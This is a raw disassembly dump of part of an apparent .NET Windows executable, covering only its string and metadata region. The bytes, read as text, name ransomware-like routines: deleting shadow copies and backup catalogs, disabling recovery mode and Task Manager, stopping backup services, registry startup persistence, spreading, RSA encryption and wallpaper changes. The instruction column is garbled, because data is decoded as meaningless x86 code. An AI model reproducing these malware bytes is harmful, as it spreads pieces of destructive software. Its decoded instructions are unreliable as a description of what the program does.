  404845:	6e                   	outsb  %ds:(%esi),(%dx)
  404846:	64 4f                	fs dec %edi
  404848:	70 65                	jo     0x4048af
  40484a:	6e                   	outsb  %ds:(%esi),(%dx)
  40484b:	4e                   	dec    %esi
  40484c:	6f                   	outsl  %ds:(%esi),(%dx)
  40484d:	74 65                	je     0x4048b4
  40484f:	00 69 73             	add    %ch,0x73(%ecx)
  404852:	4f                   	dec    %edi
  404853:	76 65                	jbe    0x4048ba
  404855:	72 00                	jb     0x404857
  404857:	72 65                	jb     0x4048be
  404859:	67 69 73 74 72 79 53 	imul   $0x74537972,0x74(%bp,%di),%esi
  404860:	74 
  404861:	61                   	popa
  404862:	72 74                	jb     0x4048d8
  404864:	75 70                	jne    0x4048d6
  404866:	00 73 70             	add    %dh,0x70(%ebx)
  404869:	72 65                	jb     0x4048d0
  40486b:	61                   	popa
  40486c:	64 49                	fs dec %ecx
  40486e:	74 00                	je     0x404870
  404870:	72 75                	jb     0x4048e7
  404872:	6e                   	outsb  %ds:(%esi),(%dx)
  404873:	43                   	inc    %ebx
  404874:	6f                   	outsl  %ds:(%esi),(%dx)
  404875:	6d                   	insl   (%dx),%es:(%edi)
  404876:	6d                   	insl   (%dx),%es:(%edi)
  404877:	61                   	popa
  404878:	6e                   	outsb  %ds:(%esi),(%dx)
  404879:	64 00 64 65 6c       	add    %ah,%fs:0x6c(%ebp,%eiz,2)
  40487e:	65 74 65             	gs je  0x4048e6
  404881:	53                   	push   %ebx
  404882:	68 61 64 6f 77       	push   $0x776f6461
  404887:	43                   	inc    %ebx
  404888:	6f                   	outsl  %ds:(%esi),(%dx)
  404889:	70 69                	jo     0x4048f4
  40488b:	65 73 00             	gs jae 0x40488e
  40488e:	64 69 73 61 62 6c 65 	imul   $0x52656c62,%fs:0x61(%ebx),%esi
  404895:	52 
  404896:	65 63 6f 76          	arpl   %ebp,%gs:0x76(%edi)
  40489a:	65 72 79             	gs jb  0x404916
  40489d:	4d                   	dec    %ebp
  40489e:	6f                   	outsl  %ds:(%esi),(%dx)
  40489f:	64 65 00 64 65 6c    	fs add %ah,%gs:0x6c(%ebp,%eiz,2)
  4048a5:	65 74 65             	gs je  0x40490d
  4048a8:	42                   	inc    %edx
  4048a9:	61                   	popa
  4048aa:	63 6b 75             	arpl   %ebp,0x75(%ebx)
  4048ad:	70 43                	jo     0x4048f2
  4048af:	61                   	popa
  4048b0:	74 61                	je     0x404913
  4048b2:	6c                   	insb   (%dx),%es:(%edi)
  4048b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4048b4:	67 00 44 69          	add    %al,0x69(%si)
  4048b8:	73 61                	jae    0x40491b
  4048ba:	62 6c 65 54          	bound  %ebp,0x54(%ebp,%eiz,2)
  4048be:	61                   	popa
  4048bf:	73 6b                	jae    0x40492c
  4048c1:	4d                   	dec    %ebp
  4048c2:	61                   	popa
  4048c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4048c4:	61                   	popa
  4048c5:	67 65 72 00          	addr16 gs jb 0x4048c9
  4048c9:	73 74                	jae    0x40493f
  4048cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4048cc:	70 42                	jo     0x404910
  4048ce:	61                   	popa
  4048cf:	63 6b 75             	arpl   %ebp,0x75(%ebx)
  4048d2:	70 53                	jo     0x404927
  4048d4:	65 72 76             	gs jb  0x40494d
  4048d7:	69 63 65 73 00 53 65 	imul   $0x65530073,0x65(%ebx),%esp
  4048de:	74 57                	je     0x404937
  4048e0:	61                   	popa
  4048e1:	6c                   	insb   (%dx),%es:(%edi)
  4048e2:	6c                   	insb   (%dx),%es:(%edi)
  4048e3:	70 61                	jo     0x404946
  4048e5:	70 65                	jo     0x40494c
  4048e7:	72 00                	jb     0x4048e9
  4048e9:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  4048ee:	00 63 6c             	add    %ah,0x6c(%ebx)
  4048f1:	70 00                	jo     0x4048f3
  4048f3:	41                   	inc    %ecx
  4048f4:	64 64 43             	fs fs inc %ebx
  4048f7:	6c                   	insb   (%dx),%es:(%edi)
  4048f8:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  4048ff:	46                   	inc    %esi
  404900:	6f                   	outsl  %ds:(%esi),(%dx)
  404901:	72 6d                	jb     0x404970
  404903:	61                   	popa
  404904:	74 4c                	je     0x404952
  404906:	69 73 74 65 6e 65 72 	imul   $0x72656e65,0x74(%ebx),%esi
  40490d:	00 53 65             	add    %dl,0x65(%ebx)
  404910:	74 50                	je     0x404962
  404912:	61                   	popa
  404913:	72 65                	jb     0x40497a
  404915:	6e                   	outsb  %ds:(%esi),(%dx)
  404916:	74 00                	je     0x404918
  404918:	69 6e 74 70 72 65 63 	imul   $0x63657270,0x74(%esi),%ebp
  40491f:	6c                   	insb   (%dx),%es:(%edi)
  404920:	70 00                	jo     0x404922
  404922:	63 75 72             	arpl   %esi,0x72(%ebp)
  404925:	72 65                	jb     0x40498c
  404927:	6e                   	outsb  %ds:(%esi),(%dx)
  404928:	74 43                	je     0x40496d
  40492a:	6c                   	insb   (%dx),%es:(%edi)
  40492b:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  404932:	00 52 65             	add    %dl,0x65(%edx)
  404935:	67 65 78 52          	addr16 gs js 0x40498b
  404939:	65 73 75             	gs jae 0x4049b1
  40493c:	6c                   	insb   (%dx),%es:(%edi)
  40493d:	74 00                	je     0x40493f
  40493f:	4d                   	dec    %ebp
  404940:	65 73 73             	gs jae 0x4049b6
  404943:	61                   	popa
  404944:	67 65 00 57 6e       	add    %dl,%gs:0x6e(%bx)
  404949:	64 50                	fs push %eax
  40494b:	72 6f                	jb     0x4049bc
  40494d:	63 00                	arpl   %eax,(%eax)
  40494f:	43                   	inc    %ebx
  404950:	72 65                	jb     0x4049b7
  404952:	61                   	popa
  404953:	74 65                	je     0x4049ba
  404955:	50                   	push   %eax
  404956:	61                   	popa
  404957:	72 61                	jb     0x4049ba
  404959:	6d                   	insl   (%dx),%es:(%edi)
  40495a:	73 00                	jae    0x40495c
  40495c:	67 65 74 5f          	addr16 gs je 0x4049bf
  404960:	43                   	inc    %ebx
  404961:	72 65                	jb     0x4049c8
  404963:	61                   	popa
  404964:	74 65                	je     0x4049cb
  404966:	50                   	push   %eax
  404967:	61                   	popa
  404968:	72 61                	jb     0x4049cb
  40496a:	6d                   	insl   (%dx),%es:(%edi)
  40496b:	73 00                	jae    0x40496d
  40496d:	47                   	inc    %edi
  40496e:	65 74 54             	gs je  0x4049c5
  404971:	65 78 74             	gs js  0x4049e8
  404974:	00 53 65             	add    %dl,0x65(%ebx)
  404977:	74 54                	je     0x4049cd
  404979:	65 78 74             	gs js  0x4049f0
  40497c:	00 61 63             	add    %ah,0x63(%ecx)
  40497f:	74 69                	je     0x4049ea
  404981:	6f                   	outsl  %ds:(%esi),(%dx)
  404982:	6e                   	outsb  %ds:(%esi),(%dx)
  404983:	00 75 50             	add    %dh,0x50(%ebp)
  404986:	61                   	popa
  404987:	72 61                	jb     0x4049ea
  404989:	6d                   	insl   (%dx),%es:(%edi)
  40498a:	00 76 50             	add    %dh,0x50(%esi)
  40498d:	61                   	popa
  40498e:	72 61                	jb     0x4049f1
  404990:	6d                   	insl   (%dx),%es:(%edi)
  404991:	00 77 69             	add    %dh,0x69(%edi)
  404994:	6e                   	outsb  %ds:(%esi),(%dx)
  404995:	49                   	dec    %ecx
  404996:	6e                   	outsb  %ds:(%esi),(%dx)
  404997:	69 00 61 72 67 73    	imul   $0x73677261,(%eax),%eax
  40499d:	00 6c 65 6e          	add    %ch,0x6e(%ebp,%eiz,2)
  4049a1:	67 74 68             	addr16 je 0x404a0c
  4049a4:	00 70 6c             	add    %dh,0x6c(%eax)
  4049a7:	61                   	popa
  4049a8:	69 6e 54 65 78 74 00 	imul   $0x747865,0x54(%esi),%ebp
  4049af:	6c                   	insb   (%dx),%es:(%edi)
  4049b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4049b1:	63 61 74             	arpl   %esp,0x74(%ecx)
  4049b4:	69 6f 6e 00 64 69 72 	imul   $0x72696400,0x6e(%edi),%ebp
  4049bb:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  4049c0:	79 00                	jns    0x4049c2
  4049c2:	69 6e 70 75 74 46 69 	imul   $0x69467475,0x70(%esi),%ebp
  4049c9:	6c                   	insb   (%dx),%es:(%edi)
  4049ca:	65 00 70 61          	add    %dh,%gs:0x61(%eax)
  4049ce:	73 73                	jae    0x404a43
  4049d0:	77 6f                	ja     0x404a41
  4049d2:	72 64                	jb     0x404a38
  4049d4:	00 6b 65             	add    %ch,0x65(%ebx)
  4049d7:	79 52                	jns    0x404a2b
  4049d9:	53                   	push   %ebx
  4049da:	41                   	inc    %ecx
  4049db:	00 6c 65 6e          	add    %ch,0x6e(%ebp,%eiz,2)
  4049df:	67 68 74 42 79 74    	addr16 push $0x74794274
  4049e5:	65 73 00             	gs jae 0x4049e8
  4049e8:	74 65                	je     0x404a4f
  4049ea:	78 74                	js     0x404a60
  4049ec:	54                   	push   %esp
  4049ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4049ee:	45                   	inc    %ebp
  4049ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4049f0:	63 72 79             	arpl   %esi,0x79(%edx)
  4049f3:	70 74                	jo     0x404a69
  4049f5:	00 70 75             	add    %dh,0x75(%eax)
  4049f8:	62 6c 69 63          	bound  %ebp,0x63(%ecx,%ebp,2)
  4049fc:	4b                   	dec    %ebx
  4049fd:	65 79 53             	gs jns 0x404a53
  404a00:	74 72                	je     0x404a74
  404a02:	69 6e 67 00 63 6f 6d 	imul   $0x6d6f6300,0x67(%esi),%ebp
  404a09:	6d                   	insl   (%dx),%es:(%edi)
  404a0a:	61                   	popa
  404a0b:	6e                   	outsb  %ds:(%esi),(%dx)
  404a0c:	64 73 00             	fs jae 0x404a0f
  404a0f:	62 61 73             	bound  %esp,0x73(%ecx)
  404a12:	65 36 34 00          	gs ss xor $0x0,%al
  404a16:	53                   	push   %ebx
  404a17:	79 73                	jns    0x404a8c
  404a19:	74 65                	je     0x404a80
  404a1b:	6d                   	insl   (%dx),%es:(%edi)
  404a1c:	2e 52                	cs push %edx
  404a1e:	75 6e                	jne    0x404a8e
  404a20:	74 69                	je     0x404a8b
  404a22:	6d                   	insl   (%dx),%es:(%edi)
  404a23:	65 2e 49             	gs cs dec %ecx
  404a26:	6e                   	outsb  %ds:(%esi),(%dx)
  404a27:	74 65                	je     0x404a8e
  404a29:	72 6f                	jb     0x404a9a
  404a2b:	70 53                	jo     0x404a80
  404a2d:	65 72 76             	gs jb  0x404aa6
  404a30:	69 63 65 73 00 4d 61 	imul   $0x614d0073,0x65(%ebx),%esp
  404a37:	72 73                	jb     0x404aac
  404a39:	68 61 6c 41 73       	push   $0x73416c61
  404a3e:	41                   	inc    %ecx
  404a3f:	74 74                	je     0x404ab5
  404a41:	72 69                	jb     0x404aac
  404a43:	62 75 74             	bound  %esi,0x74(%ebp)
  404a46:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  404a4a:	6d                   	insl   (%dx),%es:(%edi)
  404a4b:	61                   	popa
  404a4c:	6e                   	outsb  %ds:(%esi),(%dx)
  404a4d:	61                   	popa
  404a4e:	67 65 64 54          	addr16 gs fs push %esp
  404a52:	79 70                	jns    0x404ac4
  404a54:	65 00 68 77          	add    %ch,%gs:0x77(%eax)
  404a58:	6e                   	outsb  %ds:(%esi),(%dx)
  404a59:	64 00 68 57          	add    %ch,%fs:0x57(%eax)
  404a5d:	6e                   	outsb  %ds:(%esi),(%dx)
  404a5e:	64 43                	fs inc %ebx
  404a60:	68 69 6c 64 00       	push   $0x646c69
  404a65:	68 57 6e 64 4e       	push   $0x4e646e57
  404a6a:	65 77 50             	gs ja  0x404abd
  404a6d:	61                   	popa
  404a6e:	72 65                	jb     0x404ad5
  404a70:	6e                   	outsb  %ds:(%esi),(%dx)
  404a71:	74 00                	je     0x404a73
  404a73:	70 61                	jo     0x404ad6
  404a75:	74 74                	je     0x404aeb
  404a77:	65 72 6e             	gs jb  0x404ae8
  404a7a:	00 6d 00             	add    %ch,0x0(%ebp)
  404a7d:	74 78                	je     0x404af7
  404a7f:	74 00                	je     0x404a81
  404a81:	53                   	push   %ebx
  404a82:	79 73                	jns    0x404af7
  404a84:	74 65                	je     0x404aeb
  404a86:	6d                   	insl   (%dx),%es:(%edi)
  404a87:	2e 52                	cs push %edx
  404a89:	75 6e                	jne    0x404af9
  404a8b:	74 69                	je     0x404af6
  404a8d:	6d                   	insl   (%dx),%es:(%edi)
  404a8e:	65 2e 43             	gs cs inc %ebx
  404a91:	6f                   	outsl  %ds:(%esi),(%dx)
  404a92:	6d                   	insl   (%dx),%es:(%edi)
  404a93:	70 69                	jo     0x404afe
  404a95:	6c                   	insb   (%dx),%es:(%edi)
  404a96:	65 72 53             	gs jb  0x404aec
  404a99:	65 72 76             	gs jb  0x404b12
  404a9c:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  404aa3:	6d                   	insl   (%dx),%es:(%edi)
  404aa4:	70 69                	jo     0x404b0f
  404aa6:	6c                   	insb   (%dx),%es:(%edi)
  404aa7:	61                   	popa
  404aa8:	74 69                	je     0x404b13
  404aaa:	6f                   	outsl  %ds:(%esi),(%dx)
  404aab:	6e                   	outsb  %ds:(%esi),(%dx)
  404aac:	52                   	push   %edx
  404aad:	65 6c                	gs insb (%dx),%es:(%edi)
  404aaf:	61                   	popa
  404ab0:	78 61                	js     0x404b13
  404ab2:	74 69                	je     0x404b1d
  404ab4:	6f                   	outsl  %ds:(%esi),(%dx)
  404ab5:	6e                   	outsb  %ds:(%esi),(%dx)
  404ab6:	73 41                	jae    0x404af9
  404ab8:	74 74                	je     0x404b2e
  404aba:	72 69                	jb     0x404b25
  404abc:	62 75 74             	bound  %esi,0x74(%ebp)
  404abf:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  404ac3:	6e                   	outsb  %ds:(%esi),(%dx)
  404ac4:	74 69                	je     0x404b2f
  404ac6:	6d                   	insl   (%dx),%es:(%edi)
  404ac7:	65 43                	gs inc %ebx
  404ac9:	6f                   	outsl  %ds:(%esi),(%dx)
  404aca:	6d                   	insl   (%dx),%es:(%edi)
  404acb:	70 61                	jo     0x404b2e
  404acd:	74 69                	je     0x404b38
  404acf:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  404ad2:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  404ad9:	69 
  404ada:	62 75 74             	bound  %esi,0x74(%ebp)
  404add:	65 00 6c 6f 76       	add    %ch,%gs:0x76(%edi,%ebp,2)
  404ae2:	65 00 44 6c 6c       	add    %al,%gs:0x6c(%esp,%ebp,2)
  404ae7:	49                   	dec    %ecx
  404ae8:	6d                   	insl   (%dx),%es:(%edi)
  404ae9:	70 6f                	jo     0x404b5a
  404aeb:	72 74                	jb     0x404b61
  404aed:	41                   	inc    %ecx
  404aee:	74 74                	je     0x404b64
  404af0:	72 69                	jb     0x404b5b
  404af2:	62 75 74             	bound  %esi,0x74(%ebp)
  404af5:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  404af9:	65 72 33             	gs jb  0x404b2f
  404afc:	32 2e                	xor    (%esi),%ch
  404afe:	64 6c                	fs insb (%dx),%es:(%edi)
  404b00:	6c                   	insb   (%dx),%es:(%edi)
  404b01:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  404b08:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  404b0b:	30 00                	xor    %al,(%eax)
  404b0d:	53                   	push   %ebx
  404b0e:	79 73                	jns    0x404b83
  404b10:	74 65                	je     0x404b77
  404b12:	6d                   	insl   (%dx),%es:(%edi)
  404b13:	2e 54                	cs push %esp
  404b15:	68 72 65 61 64       	push   $0x64616572
  404b1a:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  404b21:	65 61                	gs popa
  404b23:	64 53                	fs push %ebx
  404b25:	74 61                	je     0x404b88
  404b27:	72 74                	jb     0x404b9d
  404b29:	00 43 53             	add    %al,0x53(%ebx)
  404b2c:	24 3c                	and    $0x3c,%al
  404b2e:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
  404b32:	43                   	inc    %ebx
  404b33:	61                   	popa
  404b34:	63 68 65             	arpl   %ebp,0x65(%eax)
  404b37:	64 41                	fs inc %ecx
  404b39:	6e                   	outsb  %ds:(%esi),(%dx)
  404b3a:	6f                   	outsl  %ds:(%esi),(%dx)
  404b3b:	6e                   	outsb  %ds:(%esi),(%dx)
  404b3c:	79 6d                	jns    0x404bab
  404b3e:	6f                   	outsl  %ds:(%esi),(%dx)
  404b3f:	75 73                	jne    0x404bb4
  404b41:	4d                   	dec    %ebp
  404b42:	65 74 68             	gs je  0x404bad
  404b45:	6f                   	outsl  %ds:(%esi),(%dx)
  404b46:	64 44                	fs inc %esp
  404b48:	65 6c                	gs insb (%dx),%es:(%edi)
  404b4a:	65 67 61             	gs addr16 popa
  404b4d:	74 65                	je     0x404bb4
  404b4f:	31 00                	xor    %eax,(%eax)
  404b51:	43                   	inc    %ebx
  404b52:	6f                   	outsl  %ds:(%esi),(%dx)
  404b53:	6d                   	insl   (%dx),%es:(%edi)
  404b54:	70 69                	jo     0x404bbf
  404b56:	6c                   	insb   (%dx),%es:(%edi)
  404b57:	65 72 47             	gs jb  0x404ba1
  404b5a:	65 6e                	outsb  %gs:(%esi),(%dx)
  404b5c:	65 72 61             	gs jb  0x404bc0
  404b5f:	74 65                	je     0x404bc6
  404b61:	64 41                	fs inc %ecx
  404b63:	74 74                	je     0x404bd9
  404b65:	72 69                	jb     0x404bd0
  404b67:	62 75 74             	bound  %esi,0x74(%ebp)
  404b6a:	65 00 4d 65          	add    %cl,%gs:0x65(%ebp)
  404b6e:	73 73                	jae    0x404be3
  404b70:	61                   	popa
  404b71:	67 65 42             	addr16 gs inc %edx
  404b74:	6f                   	outsl  %ds:(%esi),(%dx)
  404b75:	78 00                	js     0x404b77
  404b77:	44                   	inc    %esp
  404b78:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  404b7f:	73 75                	jae    0x404bf6
  404b81:	6c                   	insb   (%dx),%es:(%edi)
  404b82:	74 00                	je     0x404b84
  404b84:	53                   	push   %ebx
  404b85:	68 6f 77 00 54       	push   $0x5400776f
  404b8a:	68 72 65 61 64       	push   $0x64616572
  404b8f:	00 53 74             	add    %dl,0x74(%ebx)
  404b92:	61                   	popa
  404b93:	72 74                	jb     0x404c09
  404b95:	00 45 6e             	add    %al,0x6e(%ebp)
  404b98:	76 69                	jbe    0x404c03
  404b9a:	72 6f                	jb     0x404c0b
  404b9c:	6e                   	outsb  %ds:(%esi),(%dx)
  404b9d:	6d                   	insl   (%dx),%es:(%edi)
  404b9e:	65 6e                	outsb  %gs:(%esi),(%dx)
  404ba0:	74 00                	je     0x404ba2
  404ba2:	45                   	inc    %ebp
  404ba3:	78 69                	js     0x404c0e
  404ba5:	74 00                	je     0x404ba7
  404ba7:	41                   	inc    %ecx
  404ba8:	70 70                	jo     0x404c1a
  404baa:	6c                   	insb   (%dx),%es:(%edi)
  404bab:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  404bb2:	00 53 74             	add    %dl,0x74(%ebx)
  404bb5:	72 69                	jb     0x404c20
  404bb7:	6e                   	outsb  %ds:(%esi),(%dx)
  404bb8:	67 00 49 6e          	add    %cl,0x6e(%bx,%di)
  404bbc:	70 75                	jo     0x404c33
  404bbe:	74 4c                	je     0x404c0c
  404bc0:	61                   	popa
  404bc1:	6e                   	outsb  %ds:(%esi),(%dx)
  404bc2:	67 75 61             	addr16 jne 0x404c26
  404bc5:	67 65 00 67 65       	add    %ah,%gs:0x65(%bx)
  404bca:	74 5f                	je     0x404c2b
  404bcc:	43                   	inc    %ebx
  404bcd:	75 72                	jne    0x404c41
  404bcf:	72 65                	jb     0x404c36
  404bd1:	6e                   	outsb  %ds:(%esi),(%dx)
  404bd2:	74 49                	je     0x404c1d
  404bd4:	6e                   	outsb  %ds:(%esi),(%dx)
  404bd5:	70 75                	jo     0x404c4c
  404bd7:	74 4c                	je     0x404c25
  404bd9:	61                   	popa
  404bda:	6e                   	outsb  %ds:(%esi),(%dx)
  404bdb:	67 75 61             	addr16 jne 0x404c3f
  404bde:	67 65 00 53 79       	add    %dl,%gs:0x79(%bp,%di)
  404be3:	73 74                	jae    0x404c59
  404be5:	65 6d                	gs insl (%dx),%es:(%edi)
  404be7:	2e 47                	cs inc %edi
  404be9:	6c                   	insb   (%dx),%es:(%edi)
  404bea:	6f                   	outsl  %ds:(%esi),(%dx)
  404beb:	62 61 6c             	bound  %esp,0x6c(%ecx)
  404bee:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  404bf5:	00 43 75             	add    %al,0x75(%ebx)
  404bf8:	6c                   	insb   (%dx),%es:(%edi)
  404bf9:	74 75                	je     0x404c70
  404bfb:	72 65                	jb     0x404c62
  404bfd:	49                   	dec    %ecx
  404bfe:	6e                   	outsb  %ds:(%esi),(%dx)
  404bff:	66 6f                	outsw  %ds:(%esi),(%dx)
  404c01:	00 67 65             	add    %ah,0x65(%edi)
  404c04:	74 5f                	je     0x404c65
  404c06:	43                   	inc    %ebx
  404c07:	75 6c                	jne    0x404c75
  404c09:	74 75                	je     0x404c80
  404c0b:	72 65                	jb     0x404c72
  404c0d:	00 67 65             	add    %ah,0x65(%edi)
  404c10:	74 5f                	je     0x404c71
  404c12:	4e                   	dec    %esi
  404c13:	61                   	popa
  404c14:	6d                   	insl   (%dx),%es:(%edi)
  404c15:	65 00 6f 70          	add    %ch,%gs:0x70(%edi)
  404c19:	5f                   	pop    %edi
  404c1a:	45                   	inc    %ebp
  404c1b:	71 75                	jno    0x404c92
  404c1d:	61                   	popa
  404c1e:	6c                   	insb   (%dx),%es:(%edi)
  404c1f:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  404c26:	74 
  404c27:	65 6d                	gs insl (%dx),%es:(%edi)
  404c29:	2e 52                	cs push %edx
  404c2b:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  404c2e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  404c33:	6e                   	outsb  %ds:(%esi),(%dx)
  404c34:	00 41 73             	add    %al,0x73(%ecx)
  404c37:	73 65                	jae    0x404c9e
  404c39:	6d                   	insl   (%dx),%es:(%edi)
  404c3a:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  404c3e:	47                   	inc    %edi
  404c3f:	65 74 45             	gs je  0x404c87
  404c42:	6e                   	outsb  %ds:(%esi),(%dx)
  404c43:	74 72                	je     0x404cb7
  404c45:	79 41                	jns    0x404c88
  404c47:	73 73                	jae    0x404cbc
  404c49:	65 6d                	gs insl (%dx),%es:(%edi)
  404c4b:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  404c4f:	67 65 74 5f          	addr16 gs je 0x404cb2
  404c53:	4c                   	dec    %esp
  404c54:	6f                   	outsl  %ds:(%esi),(%dx)
  404c55:	63 61 74             	arpl   %esp,0x74(%ecx)
  404c58:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  404c5f:	74 65                	je     0x404cc6
  404c61:	6d                   	insl   (%dx),%es:(%edi)
  404c62:	2e 49                	cs dec %ecx
  404c64:	4f                   	dec    %edi
  404c65:	00 50 61             	add    %dl,0x61(%eax)
  404c68:	74 68                	je     0x404cd2
  404c6a:	00 47 65             	add    %al,0x65(%edi)
  404c6d:	74 44                	je     0x404cb3
  404c6f:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  404c76:	79 4e                	jns    0x404cc6
  404c78:	61                   	popa
  404c79:	6d                   	insl   (%dx),%es:(%edi)
  404c7a:	65 00 53 70          	add    %dl,%gs:0x70(%ebx)
  404c7e:	65 63 69 61          	arpl   %ebp,%gs:0x61(%ecx)
  404c82:	6c                   	insb   (%dx),%es:(%edi)
  404c83:	46                   	inc    %esi
  404c84:	6f                   	outsl  %ds:(%esi),(%dx)
  404c85:	6c                   	insb   (%dx),%es:(%edi)
  404c86:	64 65 72 00          	fs gs jb 0x404c8a
  404c8a:	47                   	inc    %edi
  404c8b:	65 74 46             	gs je  0x404cd4
  404c8e:	6f                   	outsl  %ds:(%esi),(%dx)
  404c8f:	6c                   	insb   (%dx),%es:(%edi)
  404c90:	64 65 72 50          	fs gs jb 0x404ce4
  404c94:	61                   	popa
  404c95:	74 68                	je     0x404cff
  404c97:	00 6f 70             	add    %ch,0x70(%edi)
  404c9a:	5f                   	pop    %edi
  404c9b:	49                   	dec    %ecx
  404c9c:	6e                   	outsb  %ds:(%esi),(%dx)
  404c9d:	65 71 75             	gs jno 0x404d15
  404ca0:	61                   	popa
  404ca1:	6c                   	insb   (%dx),%es:(%edi)
  404ca2:	69 74 79 00 53 6c 65 	imul   $0x65656c53,0x0(%ecx,%edi,2),%esi
  404ca9:	65 
  404caa:	70 00                	jo     0x404cac
  404cac:	4d                   	dec    %ebp
  404cad:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  404cb4:	74 2e                	je     0x404ce4
  404cb6:	57                   	push   %edi
  404cb7:	69 6e 33 32 00 52 65 	imul   $0x65520032,0x33(%esi),%ebp
  404cbe:	67 69 73 74 72 79 00 	imul   $0x52007972,0x74(%bp,%di),%esi
  404cc5:	52 
  404cc6:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  404ccd:	4b 65 
  404ccf:	79 00                	jns    0x404cd1
  404cd1:	43                   	inc    %ebx
  404cd2:	75 72                	jne    0x404d46
  404cd4:	72 65                	jb     0x404d3b
  404cd6:	6e                   	outsb  %ds:(%esi),(%dx)
  404cd7:	74 55                	je     0x404d2e
  404cd9:	73 65                	jae    0x404d40
  404cdb:	72 00                	jb     0x404cdd
  404cdd:	43                   	inc    %ebx
  404cde:	6f                   	outsl  %ds:(%esi),(%dx)
  404cdf:	6e                   	outsb  %ds:(%esi),(%dx)
  404ce0:	63 61 74             	arpl   %esp,0x74(%ecx)
  404ce3:	00 43 72             	add    %al,0x72(%ebx)
  404ce6:	65 61                	gs popa
  404ce8:	74 65                	je     0x404d4f
  404cea:	53                   	push   %ebx
  404ceb:	75 62                	jne    0x404d4f
  404ced:	4b                   	dec    %ebx
  404cee:	65 79 00             	gs jns 0x404cf1
  404cf1:	47                   	inc    %edi
  404cf2:	65 74 56             	gs je  0x404d4b
  404cf5:	61                   	popa
  404cf6:	6c                   	insb   (%dx),%es:(%edi)
  404cf7:	75 65                	jne    0x404d5e
  404cf9:	00 43 6c             	add    %al,0x6c(%ebx)
  404cfc:	6f                   	outsl  %ds:(%esi),(%dx)
  404cfd:	73 65                	jae    0x404d64
  404cff:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  404d03:	74 72                	je     0x404d77
  404d05:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  404d0c:	5f                   	pop    %edi
  404d0d:	4c                   	dec    %esp
  404d0e:	65 6e                	outsb  %gs:(%esi),(%dx)
  404d10:	67 74 68             	addr16 je 0x404d7b
  404d13:	00 49 44             	add    %cl,0x44(%ecx)
  404d16:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  404d1d:	6c                   	insb   (%dx),%es:(%edi)
  404d1e:	65 00 44 69 73       	add    %al,%gs:0x73(%ecx,%ebp,2)
  404d23:	70 6f                	jo     0x404d94
  404d25:	73 65                	jae    0x404d8c
  404d27:	00 53 79             	add    %dl,0x79(%ebx)
  404d2a:	73 74                	jae    0x404da0
  404d2c:	65 6d                	gs insl (%dx),%es:(%edi)
  404d2e:	2e 44                	cs inc %esp
  404d30:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  404d37:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  404d3e:	63 65 73             	arpl   %esp,0x73(%ebp)
  404d41:	73 00                	jae    0x404d43
  404d43:	47                   	inc    %edi
  404d44:	65 74 50             	gs je  0x404d97
  404d47:	72 6f                	jb     0x404db8
  404d49:	63 65 73             	arpl   %esp,0x73(%ebp)
  404d4c:	73 65                	jae    0x404db3
  404d4e:	73 00                	jae    0x404d50
  404d50:	47                   	inc    %edi
  404d51:	65 74 43             	gs je  0x404d97
  404d54:	75 72                	jne    0x404dc8
  404d56:	72 65                	jb     0x404dbd
  404d58:	6e                   	outsb  %ds:(%esi),(%dx)
  404d59:	74 50                	je     0x404dab
  404d5b:	72 6f                	jb     0x404dcc
  404d5d:	63 65 73             	arpl   %esp,0x73(%ebp)
  404d60:	73 00                	jae    0x404d62
  404d62:	50                   	push   %eax
  404d63:	72 6f                	jb     0x404dd4
  404d65:	63 65 73             	arpl   %esp,0x73(%ebp)
  404d68:	73 4d                	jae    0x404db7
  404d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  404d6b:	64 75 6c             	fs jne 0x404dda
  404d6e:	65 43                	gs inc %ebx
  404d70:	6f                   	outsl  %ds:(%esi),(%dx)
  404d71:	6c                   	insb   (%dx),%es:(%edi)
  404d72:	6c                   	insb   (%dx),%es:(%edi)
  404d73:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  404d78:	6e                   	outsb  %ds:(%esi),(%dx)
